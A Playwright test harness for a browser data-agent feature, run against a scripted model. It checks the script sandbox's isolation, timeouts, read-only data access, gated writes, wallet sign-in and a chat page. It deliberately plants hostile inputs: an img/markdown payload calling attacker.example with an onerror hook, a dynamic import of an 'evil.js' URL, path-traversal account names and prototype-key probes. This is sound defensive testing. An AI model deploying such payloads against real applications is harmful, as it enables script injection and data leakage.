// Harness for the data agent (public_html/dataagent), in a headless browser on
// the real OPFS git worker. The unit tests' in-memory store does not behave like
// it: a `..` that resolves to the store's root is the one that has already bitten.
// The model is scripted, so this needs no key and proves the toolkit, not a model.
//
//   node test_servers/data-agent-harness.mjs
import http from 'http';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { chromium } from '@playwright/test';
import { contentSecurityPolicy, CSP_NONCE_PLACEHOLDER } from '../csp.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const APP_ROOT = path.join(ROOT, 'public_html');
const PORT = 8087;
const ORIGIN = `http://localhost:${PORT}`;
const MIME = { '.html': 'text/html; charset=utf-8', '.js': 'application/javascript', '.json': 'application/json' };

const indexHtml = fs.readFileSync(path.join(APP_ROOT, 'index.html'), 'utf8');
const importMap = indexHtml.match(/<script type="importmap">[\s\S]*?<\/script>/)[0];
const NONCE = 'dataagentharnessnonce';

const server = http.createServer((req, res) => {
    const urlPath = (req.url || '/').split('?')[0];
    if (urlPath === '/test.html') {
        res.writeHead(200, { 'Content-Type': MIME['.html'] });
        res.end(`<!doctype html><html><head><meta charset="utf-8">${importMap}</head><body></body></html>`);
        return;
    }
    // The production policy, on a page whose only script is a nonced module.
    if (urlPath === '/csp.html') {
        const policy = contentSecurityPolicy.replaceAll(CSP_NONCE_PLACEHOLDER, NONCE);
        res.writeHead(200, { 'Content-Type': MIME['.html'] });
        res.end(`<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${policy}"></head><body>
<script type="module" nonce="${NONCE}">
import { runScript } from '/dataagent/script-sandbox.js';
try {
    const ran = await runScript('const b = 2n ** 80n; print(String(b)); return await app.echo({ ok: true });', { echo: async (args) => args });
    window.__cspResult = ran;
} catch (error) { window.__cspResult = { failed: String(error) }; }
</script></body></html>`);
        return;
    }
    const file = path.join(APP_ROOT, urlPath);
    fs.readFile(file, (error, data) => {
        if (error) { res.writeHead(404); res.end('not found'); return; }
        res.writeHead(200, { 'Content-Type': MIME[path.extname(file)] || 'application/octet-stream' });
        res.end(data);
    });
}).listen(PORT);

const results = [];
const check = (name, ok, detail = '') => {
    results.push(ok);
    console.log(`${ok ? 'ok  ' : 'FAIL'} ${name}${detail ? ` -- ${detail}` : ''}`);
};

const browser = await chromium.launch();

// Every request the page makes that is not this server or a CDN the app loads
// code from. Reading data must not add to it.
async function newPage() {
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    const external = [];
    const CODE_HOSTS = /^https:\/\/(cdn\.jsdelivr\.net|ga\.jspm\.io|esm\.sh)\//;
    await ctx.route('**/*', (route) => {
        const url = route.request().url();
        if (url.startsWith(ORIGIN) || CODE_HOSTS.test(url)) return route.continue();
        external.push(url);
        return route.abort();
    });
    page.on('pageerror', (error) => console.log('  pageerror:', error.message));
    return { ctx, page, external };
}

const ACCOUNT = 'alice.near';
const MARKER = 'NEVER_IN_THE_PROMPT_7f3a';
const ROWS = 100_000;

// ---- CSP: the sandbox under the production policy -------------------------------
{
    const { ctx, page } = await newPage();
    await page.goto(`${ORIGIN}/csp.html`);
    await page.waitForFunction(() => window.__cspResult, null, { timeout: 60000 });
    const ran = await page.evaluate(() => window.__cspResult);
    check('QuickJS loads and runs under the production CSP',
        ran.output?.[0] === String(2n ** 80n) && ran.value === '{"ok":true}', JSON.stringify(ran));
    await ctx.close();
}

// ---- Everything else: one page on one real OPFS store ---------------------------
{
    const { ctx, page, external } = await newPage();
    await page.goto(`${ORIGIN}/test.html`);

    const out = await page.evaluate(async ({ ACCOUNT, MARKER, ROWS }) => {
        const gs = await import('/storage/gitstorage.js');
        const store = await import('/storage/domainobjectstore.js');
        const { createDataSession } = await import('/dataagent/data-api.js');
        const { runScript, formatScriptResult } = await import('/dataagent/script-sandbox.js');
        const { runAgentTurn } = await import('/dataagent/agent.js');
        const r = {};

        // Everything in the store, to tell whether anything changed.
        const snapshot = async (dir = '.') => {
            const files = {};
            for (const name of await gs.readdir(dir)) {
                if (name.startsWith('.')) continue;
                const full = dir === '.' ? name : `${dir}/${name}`;
                const children = await gs.readdir(full).catch(() => null);
                if (children) Object.assign(files, await snapshot(full));
                else files[full] = await gs.readTextFile(full);
            }
            return files;
        };

        await gs.configure_user({ accessToken: 'ANON', username: 'Test', useremail: 't@example.com' });
        await store.setAccounts([ACCOUNT, 'nodata.near']);
        await store.setDepositAccounts({});
        await store.setHistoricalPriceData('NEAR', 'usd', { '2026-01-01': 5, '2026-01-02': 6 });

        // Fixture: a balance chain with one planted gap at row 50 000, and one row
        // no query below asks for. Written through the app's own writers.
        const day = 86400000;
        const start = Date.parse('2025-01-01');
        const records = [];
        let balance = 0n;
        for (let i = 0; i < ROWS; i++) {
            const amount = 1000n;
            if (i === 50000) balance += 777n; // the gap: a change with no record
            records.push({
                block_height: 100 + i,
                block_timestamp: new Date(start + (i % 365) * day).toJSON(),
                tx_hash: `HASH${i}`,
                token_id: i % 2 ? 'near' : 'usdc.near',
                signer_id: 'sender.near',
                receiver_id: ACCOUNT,
                counterparty: 'sender.near',
                amount: String(amount),
                balance_before: String(balance),
                balance_after: String(balance + amount),
                memo: i === 70000 ? MARKER : '', // not first or last: describe samples those
            });
            balance += amount;
        }
        const startedAt = performance.now();
        await store.writeAccountingRecords(ACCOUNT, { version: 2, accountId: ACCOUNT, records });
        r.recordsChars = JSON.stringify({ records }).length;
        r.writeMs = Math.round(performance.now() - startedAt);
        await store.writeTransactions(ACCOUNT, [{ hash: 'T1', block_timestamp: String(BigInt(start) * 1_000_000n), balance: '1' }]);
        await store.writeConfidentialIntentsHistory(ACCOUNT, [{
            status: 'SUCCESS', createdAt: '2026-07-08T18:04:42.251349Z', depositAddress: 'd1', depositMemo: null,
            originAsset: 'nep141:unknown-token.near', destinationAsset: 'nep141:unknown-token.near',
            amountInFormatted: '1', amountOutFormatted: '1', depositType: 'INTENTS', recipientType: 'CONFIDENTIAL_INTENTS',
        }]);

        // A break just past where a scan split by hand once stopped: per token, and
        // out of block order, as nothing guarantees the stored order.
        const chain = [];
        const held = { near: 0n, 'usdc.near': 0n };
        for (let i = 0; i < 60000; i++) {
            const token = i % 3 ? 'near' : 'usdc.near';
            if (i === 50002) held.near += 777n;
            chain.push({ block_height: 1000 + i, block_timestamp: new Date(start + i * 1000).toJSON(), tx_hash: `C${i}`, token_id: token, amount: '1000', balance_before: String(held[token]), balance_after: String(held[token] + 1000n) });
            held[token] += 1000n;
        }
        [chain[10], chain[11]] = [chain[11], chain[10]];
        await store.writeAccountingRecords('chain.near', { records: chain });
        const before = await snapshot();
        r.files = Object.keys(before).sort();
        const session = createDataSession();
        const { api } = session;

        // ---- Script access through app.* ----
        let started = performance.now();
        const gapScript = await runScript(`
            let last = null, gaps = [], rows = 0;
            for await (const row of app.rows({ dataset: 'records', account: '${ACCOUNT}', fields: ['block_height', 'balance_before', 'balance_after'] })) {
                rows++;
                if (last !== null && BigInt(row.balance_before) !== BigInt(last)) gaps.push(row.block_height);
                last = row.balance_after;
            }
            print('rows', rows);
            return gaps;
        `, api);
        r.gapScript = { ...gapScript, ms: Math.round(performance.now() - started) };

        r.describe = await api.describe({ dataset: 'records', account: ACCOUNT });
        r.bigWhere = await api.query({ dataset: 'records', account: ACCOUNT, where: [['balance_after', '>', '99999000']], fields: ['block_height'], limit: 3 });
        r.tokenFrom = await api.query({ dataset: 'records', account: ACCOUNT, token: 'near', from: '2025-01-02', to: '2025-01-02', limit: 1, fields: ['token_id', 'block_timestamp'] });
        r.prices = await api.query({ dataset: 'prices', token: 'NEAR' });
        r.aggregate = await api.aggregate({ dataset: 'records', account: ACCOUNT, groupBy: ['token_id'], metrics: { total: ['sum', 'amount'], top: ['max', 'balance_after'] } });
        r.fullWalk = await runScript(`let n = 0; for await (const row of app.rows({ dataset: 'records', account: '${ACCOUNT}' })) n++; return n;`, api);
        r.afterFullWalk = await runScript(`return (await app.aggregate({ dataset: 'records', account: '${ACCOUNT}' })).matching`, api);
        const chainSession = createDataSession();
        r.breaks = await chainSession.api.balanceBreaks({ account: 'chain.near' });
        r.breaksViaScript = await runScript(`return (await app.balanceBreaks({ account: 'chain.near', token: 'usdc.near' })).breakCount`, chainSession.api);
        r.nanoseconds = await api.describe({ dataset: 'transactions', account: ACCOUNT });
        r.check = await api.checkData();

        // ---- What a script must not reach ----
        r.isolation = await runScript(`
            const found = {};
            for (const name of ['fetch', 'XMLHttpRequest', 'document', 'window', 'navigator', 'localStorage', 'indexedDB', 'WebSocket', 'Worker', 'std', 'os', 'require', 'process']) {
                found[name] = typeof globalThis[name];
            }
            found.viaFunction = new Function('return typeof fetch')();
            found.readFile = typeof app.readFile;
            found.writeFile = typeof app.writeFile;
            found.applyChange = typeof app.applyChange;
            try { await import('https://example.test/evil.js'); found.dynamicImport = 'loaded'; } catch (error) { found.dynamicImport = 'refused'; }
            return found;
        `, api);
        r.inherited = await runScript(`
            const out = {};
            out.onApp = typeof app.constructor;
            out.viaEnv = await env.callHostAsync({ function_name: 'appCall', method: '__proto__', args: '{}' });
            return out;
        `, api);
        // quickjs-wasm 0.0.6 answers a host function it does not have with undefined.
        // Object.prototype.constructor would answer with something else.
        r.unknownHostFunction = await runScript(`
            const answers = [];
            for (const name of ['constructor', 'toString', '__proto__', 'hasOwnProperty']) answers.push(typeof await env.callHostAsync({ function_name: name }));
            return answers.join();
        `, api, { timeoutMs: 3000 });
        r.traversal = {};
        for (const account of ['..', '../..', '../accounts', 'alice.near/../..', '.', 'ALICE/x']) {
            r.traversal[account] = await api.query({ dataset: 'records', account }).then(() => 'answered', (error) => error.message);
        }
        r.unknownDataset = await api.query({ dataset: '../accounts.json' }).then(() => 'answered', (error) => error.message);
        r.proto = await api.query({ dataset: '__proto__' }).then(() => 'answered', (error) => error.message);

        // ---- A script cannot run forever, or take the page's memory ----
        started = performance.now();
        r.loop = await runScript('while (true) {}', api, { timeoutMs: 1000 });
        r.loopMs = Math.round(performance.now() - started);
        started = performance.now();
        r.loopAfterHost = await runScript(`await app.listDatasets(); try { while (true) {} } catch (e) { } while (true) {}`, api, { timeoutMs: 1000 });
        r.loopAfterHostMs = Math.round(performance.now() - started);
        // A report can take longer than a script may run; waiting for it is not the script running.
        const slow = { slow: () => new Promise((resolve) => setTimeout(() => resolve('ready'), 1500)) };
        started = performance.now();
        r.slowHost = await runScript(`return await app.slow()`, slow, { timeoutMs: 1000 });
        r.loopAfterSlowHost = await runScript(`await app.slow(); while (true) {}`, slow, { timeoutMs: 1000 });
        r.slowHostMs = Math.round(performance.now() - started);
        r.memory = await runScript(`const a = []; while (true) a.push(new Array(1000000).fill(1));`, api);
        r.afterMemory = await runScript('return 1 + 1', api);
        r.syntax = await runScript('this is not javascript', api);
        const hugePrint = await runScript(`print('x'.repeat(100000));`, api);
        r.hugePrintChars = formatScriptResult(hugePrint).length;

        // ---- Large data does not reach the model ----
        const bodies = [];
        const replies = [
            { tool_calls: [{ id: 'c1', type: 'function', function: { name: 'describe_data', arguments: JSON.stringify({ dataset: 'records', account: ACCOUNT }) } }] },
            { tool_calls: [{ id: 'c2', type: 'function', function: { name: 'query_data', arguments: JSON.stringify({ dataset: 'records', account: ACCOUNT, limit: 1000 }) } }] },
            { tool_calls: [{ id: 'c3', type: 'function', function: { name: 'run_script', arguments: JSON.stringify({ code: `const { matching } = await app.query({ dataset: 'records', account: '${ACCOUNT}', where: [['memo', '!=', '']], limit: 1 }); return matching;` }) } }] },
            { tool_calls: [{ id: 'c4', type: 'function', function: { name: 'check_data', arguments: '{}' } }] },
            { tool_calls: [{ id: 'c5', type: 'function', function: { name: 'query_data', arguments: 'not json' } }] },
            { content: 'Done.' },
        ];
        const fetchFn = async (url, init) => {
            bodies.push(init.body);
            return new Response(JSON.stringify({ choices: [{ message: { role: 'assistant', content: null, ...replies[bodies.length - 1] } }] }));
        };
        const turn = await runAgentTurn({ session, apiKey: 'test-key', userMessage: 'Anything wrong?', fetchFn });
        r.turn = {
            answer: turn.answer,
            requests: bodies.length,
            markerInAnyRequest: bodies.some((body) => body.includes(MARKER)),
            largestRequestChars: Math.max(...bodies.map((body) => body.length)),
            toolResultChars: turn.messages.filter((m) => m.role === 'tool').map((m) => m.content.length),
            scriptCount: turn.messages.filter((m) => m.role === 'tool')[2].content,
            model: JSON.parse(bodies[0]).model,
        };

        // ---- Reading changed nothing ----
        const after = await snapshot();
        r.readOnly = {
            sameFiles: JSON.stringify(Object.keys(after).sort()) === JSON.stringify(Object.keys(before).sort()),
            changed: Object.keys(after).filter((name) => after[name] !== before[name]),
            added: Object.keys(after).filter((name) => !(name in before)),
        };

        // ---- Writes ----
        r.writes = {};
        const rejected = async (run) => run().then(() => 'accepted', (error) => error.message);
        const accountsBefore = await gs.readTextFile('accounts.json');
        r.writes.badAccount = await rejected(() => api.proposeChange({ op: 'addAccount', args: { accountId: '../../evil' } }));
        r.writes.duplicate = await rejected(() => api.proposeChange({ op: 'addAccount', args: { accountId: ACCOUNT } }));
        r.writes.unknownOp = await rejected(() => api.proposeChange({ op: 'writeAccountingRecords', args: { account: ACCOUNT, records: [] } }));
        r.writes.protoOp = await rejected(() => api.proposeChange({ op: 'constructor', args: {} }));
        r.writes.badToken = await rejected(() => api.proposeChange({ op: 'excludeToken', args: { contractId: '<img src=x>' } }));
        r.writes.unchangedByRejected = (await gs.readTextFile('accounts.json')) === accountsBefore;

        const proposed = await runScript(`return await app.proposeChange({ op: 'addAccount', args: { accountId: 'bob.near' } });`, api);
        r.writes.proposed = proposed;
        r.writes.proposalWroteNothing = (await gs.readTextFile('accounts.json')) === accountsBefore;
        r.writes.pending = session.pendingChanges().length;
        r.writes.scriptCannotApply = await runScript(`return typeof app.applyChange`, api);
        await session.applyChange(session.pendingChanges()[0].id);
        r.writes.accountsAfter = await store.getAccounts();
        r.writes.seenBySession = (await api.query({ dataset: 'accounts' })).rows.map((row) => row.accountId);
        r.writes.applyTwice = await rejected(() => session.applyChange(1));

        const stale = await api.proposeChange({ op: 'addAccount', args: { accountId: 'carol.near' } });
        await store.setAccounts([...await store.getAccounts(), 'carol.near']);
        r.writes.staleProposal = await rejected(() => session.applyChange(stale.id));

        const excluded = await api.proposeChange({ op: 'excludeToken', args: { contractId: 'spam.near', symbol: 'SPAM', reason: 'no price' } });
        await session.applyChange(excluded.id);
        r.writes.exclusions = await store.getTokenExclusions();
        r.writes.toolList = (await import('/dataagent/agent.js')).TOOLS.map((tool) => tool.name);
        r.writes.recordsUntouched = (await gs.readTextFile(`accountdata/${ACCOUNT}/records.json`)) === before[`accountdata/${ACCOUNT}/records.json`];

        // ---- checkData on damaged files, written past the API on purpose ----
        await gs.writeFile(`accountdata/${ACCOUNT}/transactions.json`, '{ not json');
        await gs.writeFile(`accountdata/${ACCOUNT}/fungible_token_transactions.json`, '<<<<<<< HEAD\n[]\n=======\n[1]\n>>>>>>> theirs\n');
        await gs.writeFile(`accountdata/${ACCOUNT}/stakingpools/pool.near.json`, '{"not":"an array"}');
        await store.setAccounts([ACCOUNT, 'nodata.near']);
        const fresh = createDataSession();
        r.damaged = await fresh.api.checkData();
        r.damagedRead = await fresh.api.query({ dataset: 'transactions', account: ACCOUNT }).then(() => 'answered', (error) => error.message);
        r.damagedScript = await runScript(`
            try { await app.query({ dataset: 'transactions', account: '${ACCOUNT}' }); } catch (error) { print('caught:', error.message); }
            const { problems } = await app.checkData();
            return problems.map((problem) => problem.status);
        `, fresh.api);
        return r;
    }, { ACCOUNT, MARKER, ROWS });

    const parsed = (result) => JSON.parse(result.value);
    console.log(`  fixture: ${(out.recordsChars / 1e6).toFixed(1)} MB of records, ${ROWS} rows, written in ${out.writeMs} ms`);

    check('a script finds the planted gap through app.rows',
        out.gapScript.error === null && out.gapScript.output[0] === `rows ${ROWS}` && out.gapScript.value === '[50100]',
        `${out.gapScript.value} in ${out.gapScript.ms} ms ${out.gapScript.error ?? ''}`);
    check('describe gives the shape, not the content',
        out.describe.rows === ROWS && out.describe.fields.includes('balance_after') && out.describe.tokenCount === 2
        && out.describe.sample.length === 2 && JSON.stringify(out.describe).length < 3000,
        `${JSON.stringify(out.describe).length} chars, ${out.describe.firstEntry}..${out.describe.lastEntry}`);
    check('where compares balances as big integers', out.bigWhere.matching === 2 && out.bigWhere.rows.length === 2, `matching ${out.bigWhere.matching}`);
    const near = out.aggregate.groups.find((group) => group.token_id === 'near');
    check('aggregate totals every row exactly, without passing them through a script',
        out.aggregate.matching === ROWS && near?.count === ROWS / 2 && near?.total === String(1000n * BigInt(ROWS / 2)) && near?.top === String(BigInt(ROWS) * 1000n + 777n),
        JSON.stringify(near));
    const found = out.breaks.breaks[0];
    check('balanceBreaks finds a break past any page boundary, per token, whatever the stored order',
        out.breaks.checkedRows === 60000 && out.breaks.tokens === 2 && out.breaks.breakCount === 1 && found?.block_height === 51002 && found?.token === 'near' && found?.difference === '777',
        JSON.stringify(out.breaks).slice(0, 220));
    check('a chain with no break reports none', out.breaksViaScript.value === '0', out.breaksViaScript.value);
    check('a script walks every row of a file far larger than its memory', out.fullWalk.error === null && out.fullWalk.value === String(ROWS),
        `${out.fullWalk.value ?? out.fullWalk.error} rows from ${(out.recordsChars / 1e6).toFixed(1)} MB`);
    check('the next script is unaffected', out.afterFullWalk.value === String(ROWS), out.afterFullWalk.value);
    check('token and date filters apply', out.tokenFrom.rows[0]?.token_id === 'near' && out.tokenFrom.rows[0]?.block_timestamp.startsWith('2025-01-02'));
    check('prices read through the app, not via ..', out.prices.rows.length === 2 && out.prices.rows[0].token === 'NEAR', JSON.stringify(out.prices.rows));
    check('nanosecond timestamps read as dates', out.nanoseconds.firstEntry?.startsWith('2025-01-01'), out.nanoseconds.firstEntry);
    check('checkData is clean on good data, and names accounts with no data',
        out.check.problems.length === 0 && out.check.accountsWithoutData.join() === 'nodata.near' && out.check.checked > 0,
        JSON.stringify({ checked: out.check.checked, problems: out.check.problems, without: out.check.accountsWithoutData }));

    const isolation = parsed(out.isolation);
    const reachable = Object.entries(isolation).filter(([, value]) => value !== 'undefined' && value !== 'refused');
    check('a script reaches no network, DOM, storage or write API', out.isolation.error === null && reachable.length === 0, JSON.stringify(isolation));
    check('inherited names are not app methods or host functions', parsed(out.inherited).onApp === 'undefined' && /does not exist/.test(parsed(out.inherited).viaEnv) && out.unknownHostFunction.value === 'undefined,undefined,undefined,undefined',
        `${JSON.stringify(out.inherited)} ${JSON.stringify(out.unknownHostFunction)}`);
    check('a path as an account is refused', Object.values(out.traversal).every((answer) => /valid account/.test(answer)), JSON.stringify(out.traversal));
    check('a path or __proto__ as a dataset is refused', /unknown dataset/.test(out.unknownDataset) && /unknown dataset/.test(out.proto));

    check('an endless loop is stopped', /did not finish/.test(out.loop.error ?? '') && out.loopMs < 5000, `${out.loopMs} ms`);
    check('a loop after a host call, swallowing the interrupt, is stopped', /did not finish/.test(out.loopAfterHost.error ?? '') && out.loopAfterHostMs < 5000, `${out.loopAfterHostMs} ms: ${out.loopAfterHost.error}`);
    check('waiting for the app does not use up a script\'s time, and a loop after it is still stopped',
        out.slowHost.value === 'ready' && /did not finish/.test(out.loopAfterSlowHost.error ?? '') && out.slowHostMs < 6000,
        `${out.slowHost.value ?? out.slowHost.error}; ${out.loopAfterSlowHost.error}; ${out.slowHostMs} ms`);
    check('running out of memory fails the script, not the page', !!out.memory.error && out.afterMemory.value === '2', `${out.memory.error}`);
    check('a syntax error comes back as an error', !!out.syntax.error, out.syntax.error);
    check('script output is capped', out.hugePrintChars < 6200, `${out.hugePrintChars} chars`);

    check('the agent loop runs the scripted tools to the end', out.turn.answer === 'Done.' && out.turn.requests === 6);
    check('a script counted the marker row without the model seeing it', out.turn.scriptCount === 'returned: 1', out.turn.scriptCount);
    check('a row nobody asked for never reaches the model', !out.turn.markerInAnyRequest);
    check('tool results stay within the cap', out.turn.toolResultChars.every((chars) => chars <= 6200), out.turn.toolResultChars.join(', '));
    check('no request carries the file', out.turn.largestRequestChars < 30000, `largest request ${out.turn.largestRequestChars} chars of ${out.recordsChars}`);

    check('reading left the store byte-for-byte unchanged, including the confidential history case',
        out.readOnly.sameFiles && out.readOnly.changed.length === 0 && out.readOnly.added.length === 0, JSON.stringify(out.readOnly));
    check('reading made no network request', external.length === 0, external.join(' '));

    const w = out.writes;
    check('invalid changes are refused', /valid NEAR account/.test(w.badAccount) && /already tracked/.test(w.duplicate)
        && /unknown change/.test(w.unknownOp) && /unknown change/.test(w.protoOp) && /valid token contract/.test(w.badToken) && w.unchangedByRejected,
        JSON.stringify({ a: w.badAccount, b: w.duplicate, c: w.unknownOp, d: w.protoOp, e: w.badToken }));
    check('proposing writes nothing', w.proposalWroteNothing && w.pending === 1 && w.proposed.error === null);
    check('a script cannot apply a change', w.scriptCannotApply.value === 'undefined', w.scriptCannotApply.value);
    check('an approved change lands through the app API and is seen', w.accountsAfter.join() === `${ACCOUNT},nodata.near,bob.near` && w.seenBySession.includes('bob.near'), w.accountsAfter.join());
    check('a change applies once', /no pending change/.test(w.applyTwice));
    check('a proposal the store has outrun is refused', /already tracked/.test(w.staleProposal));
    check('token exclusion keeps its file format', w.exclusions.excluded[0]?.contractId === 'spam.near' && w.exclusions.excluded[0]?.reason === 'no price' && Array.isArray(w.exclusions.kept), JSON.stringify(w.exclusions));
    check('the toolkit has no raw file or record writer', !w.toolList.some((name) => /file|write|apply|record/i.test(name)), w.toolList.join());
    check('transaction data is untouched by changes', w.recordsUntouched);

    const statusOf = (suffix) => out.damaged.problems.find((problem) => problem.path.endsWith(suffix))?.status;
    check('checkData names each damaged file and its state',
        statusOf('/transactions.json') === 'unparseable' && statusOf('/fungible_token_transactions.json') === 'conflict-markers' && statusOf('/pool.near.json') === 'wrong-shape',
        JSON.stringify(out.damaged.problems));
    check('a damaged file fails a query clearly', /could not be read, run checkData/.test(out.damagedRead), out.damagedRead);
    check('a script can catch that and go on to checkData', out.damagedScript.error === null && /caught/.test(out.damagedScript.output[0]) && parsed(out.damagedScript).length === 3, JSON.stringify(out.damagedScript));
    await ctx.close();
}

// ---- The page, and connecting an account ---------------------------------------
{
    const { ctx, page, external } = await newPage();
    await page.goto(`${ORIGIN}/test.html`);
    const out = await page.evaluate(async ({ ACCOUNT }) => {
        const gs = await import('/storage/gitstorage.js');
        const store = await import('/storage/domainobjectstore.js');
        const nearai = await import('/dataagent/nearai-account.js');
        const { __setTestWallet } = await import('/arizgateway/arizgatewayaccess.js');
        await import('/dataagent/ai-assistant-page.component.js');
        const r = {};
        await gs.configure_user({ accessToken: 'ANON', username: 'Test', useremail: 't@example.com' });
        await store.setAccounts([ACCOUNT]);

        // ---- Wallet sign-in, against a fake NEAR AI ----
        const calls = [];
        const reply = (status, body) => new Response(JSON.stringify(body), { status });
        let keyChecks = 0;
        const fetchFn = async (url, init = {}) => {
            const path = url.replace('https://cloud-api.near.ai/v1', '');
            const method = init.method ?? 'GET';
            calls.push({ method, path, auth: init.headers?.Authorization, body: init.body && JSON.parse(init.body) });
            if (path === '/auth/near') return reply(200, { access_token: 'SESSION' });
            if (path === '/users/me') return reply(200, { workspaces: [{ id: 'w1' }] });
            if (path === '/workspaces/w1/api-keys' && method === 'POST') return reply(200, { key: 'sk-NEWKEY', id: 'k2' });
            if (path === '/check_api_key') return reply(++keyChecks === 1 ? 401 : 200, {});
            if (path === '/users/me/refresh-tokens' && method === 'GET') {
                return reply(200, [{ id: 'old', created_at: '2020-01-01T00:00:00Z' }, { id: 'mine', created_at: new Date().toJSON() }]);
            }
            return reply(200, {});
        };
        const signatures = [];
        __setTestWallet({
            async getAccounts() { return [{ accountId: 'wallet-user.near' }]; },
            async signMessage(params) {
                signatures.push(params);
                return { accountId: 'wallet-user.near', publicKey: 'ed25519:PK', signature: 'SIG' };
            },
            async signOut() { },
        });
        const connected = await nearai.connectWithWallet({ fetchFn, sleep: async () => { }, previous: { keyId: 'k1', workspaceId: 'w1' } });
        r.connected = connected;
        r.signatures = signatures.map(({ message, recipient, nonce }) => ({ message, recipient, nonceLength: nonce.length, nonceTime: Number(new DataView(nonce.buffer).getBigUint64(0)) }));
        r.calls = calls;
        nearai.storeAccount(connected);
        r.loaded = nearai.loadAccount();
        const repoText = [];
        for (const name of await gs.readdir('.')) {
            if (!name.startsWith('.') && !(await gs.readdir(name).catch(() => null))) repoText.push(await gs.readTextFile(name));
        }
        r.keyInStore = repoText.some((text) => text.includes('sk-NEWKEY'));
        nearai.forgetAccount();
        r.afterForget = nearai.loadAccount();

        // ---- The page, against a scripted model ----
        nearai.storeAccount({ key: 'sk-TEST' });
        const HOSTILE = '<img src="https://attacker.example/x.png?leak=1" onerror="window.__pwned=1"> ![x](https://attacker.example/y.png)';
        const bodies = [];
        const script = [
            { tool_calls: [{ id: 'c1', type: 'function', function: { name: 'run_script', arguments: JSON.stringify({ code: `print(${JSON.stringify(HOSTILE)}); return 42;` }) } }] },
            { tool_calls: [{ id: 'c2', type: 'function', function: { name: 'propose_change', arguments: JSON.stringify({ op: 'addAccount', args: { accountId: 'bob.near' } }) } }] },
            { tool_calls: [{ id: 'c3', type: 'function', function: { name: 'propose_change', arguments: JSON.stringify({ op: 'addAccount', args: { accountId: 'carol.near' } }) } }] },
            { content: HOSTILE },
        ];
        const realFetch = window.fetch;
        window.fetch = async (url, init) => {
            if (!String(url).startsWith('https://cloud-api.near.ai/')) return realFetch(url, init);
            // The model list, and an attestation report NEAR AI refuses: this run
            // is the not-private path, which the owner must accept first.
            if (String(url).includes('/v1/models')) {
                return new Response(JSON.stringify({ data: [{ id: 'Qwen/Qwen3.6-35B-A3B-FP8', name: 'Qwen 3.6 35B A3B FP8' }, { id: 'anthropic/claude-sonnet-5-5', name: 'Claude Sonnet 5.5' }] }));
            }
            if (String(url).includes('/v1/attestation/report')) {
                return new Response(JSON.stringify({ error: { message: 'TEE attestation is not supported for external providers' } }), { status: 400 });
            }
            bodies.push({ url: String(url), auth: init.headers.Authorization, body: JSON.parse(init.body) });
            return new Response(JSON.stringify({ choices: [{ message: { role: 'assistant', content: null, ...script[bodies.length - 1] } }] }));
        };
        const element = document.createElement('ai-assistant-page');
        document.body.append(element);
        const $ = (id) => element.shadowRoot.getElementById(id);
        r.page = { sendBeforeAcknowledge: $('send').disabled };
        for (let i = 0; i < 200 && $('acknowledgebox').hidden; i++) await new Promise((resolve) => setTimeout(resolve, 50));
        r.page.privacyText = $('privacytext').textContent;
        r.page.models = [...$('model').options].map((o) => o.value);
        $('acknowledge').click();
        r.page.sendAfterAcknowledge = $('send').disabled;
        $('question').value = 'Anything wrong?';
        $('ask').requestSubmit();
        const waitFor = async (condition) => {
            for (let i = 0; i < 200 && !condition(); i++) await new Promise((resolve) => setTimeout(resolve, 50));
        };
        await waitFor(() => element.shadowRoot.querySelector('.entry-answer'));
        await new Promise((resolve) => setTimeout(resolve, 300));
        const root = element.shadowRoot;
        r.page.answerText = root.querySelector('.entry-answer')?.textContent;
        r.page.images = root.querySelectorAll('img').length;
        r.page.pwned = !!window.__pwned;
        r.page.toolEntries = root.querySelectorAll('.entry-tool').length;
        r.page.scriptShown = root.querySelector('.entry-tool pre')?.textContent.includes('return 42');
        r.page.outputShown = root.querySelectorAll('.entry-tool pre')[1]?.textContent.includes('returned: 42');
        r.page.pending = root.querySelectorAll('.pending-change').length;
        r.page.accountsBeforeApproval = await store.getAccounts();
        r.page.model = bodies[0]?.body.model;
        r.page.auth = bodies[0]?.auth;
        root.querySelectorAll('.pending-change .approve')[0].click();
        await waitFor(() => root.querySelectorAll('.pending-change').length === 1);
        root.querySelector('.pending-change .reject').click();
        await new Promise((resolve) => setTimeout(resolve, 100));
        r.page.pendingAfter = root.querySelectorAll('.pending-change').length;
        r.page.accountsAfter = await store.getAccounts();
        window.fetch = realFetch;
        return r;
    }, { ACCOUNT });

    check('wallet sign-in signs for NEAR AI and creates a capped, expiring key',
        out.signatures.length === 1 && out.signatures[0].recipient === 'cloud.near.ai' && out.signatures[0].nonceLength === 32
        && Math.abs(out.signatures[0].nonceTime - Date.now()) < 60000
        && out.calls.find((c) => c.path === '/workspaces/w1/api-keys')?.body.spendLimit.amount === 5_000_000_000
        && !!out.calls.find((c) => c.path === '/workspaces/w1/api-keys')?.body.expires_at,
        JSON.stringify(out.signatures));
    check('the sign-in sends the signed account and a 32-byte nonce',
        out.calls[0].path === '/auth/near' && out.calls[0].body.signed_message.accountId === 'wallet-user.near' && out.calls[0].body.payload.nonce.length === 32);
    check('a key that is not active yet is waited for', out.connected.status === 'ok' && out.calls.filter((c) => c.path === '/check_api_key').length === 2);
    check('the previous key is replaced', out.calls.some((c) => c.method === 'DELETE' && c.path === '/workspaces/w1/api-keys/k1'));
    check('only the session this sign-in opened is closed',
        out.calls.some((c) => c.method === 'DELETE' && c.path === '/users/me/refresh-tokens/mine') && !out.calls.some((c) => c.path === '/users/me/refresh-tokens/old'));
    check('the key is kept in this browser, not the store', out.loaded.key === 'sk-NEWKEY' && !out.keyInStore && out.afterForget === null);

    const p = out.page;
    check('nothing can be asked before the privacy notice is accepted', p.sendBeforeAcknowledge === true && p.sendAfterAcknowledge === false);
    check('a model NEAR AI cannot attest is called not private, with what NEAR AI said',
        /^Not private\./.test(p.privacyText ?? '') && /external providers/.test(p.privacyText) && /can read them/.test(p.privacyText), p.privacyText);
    check('every model NEAR AI lists can be chosen', p.models?.length === 2 && p.models.includes('anthropic/claude-sonnet-5-5'), JSON.stringify(p.models));
    check('the page talks to the pinned model with the user\'s key', /Qwen3\.6-35B-A3B-FP8$/.test(p.model) && p.auth === 'Bearer sk-TEST', p.model);
    check('hostile text from the model and from script output stays text',
        p.images === 0 && !p.pwned && p.answerText?.includes('<img src=') && !external.some((url) => url.includes('attacker.example')), `images ${p.images}`);
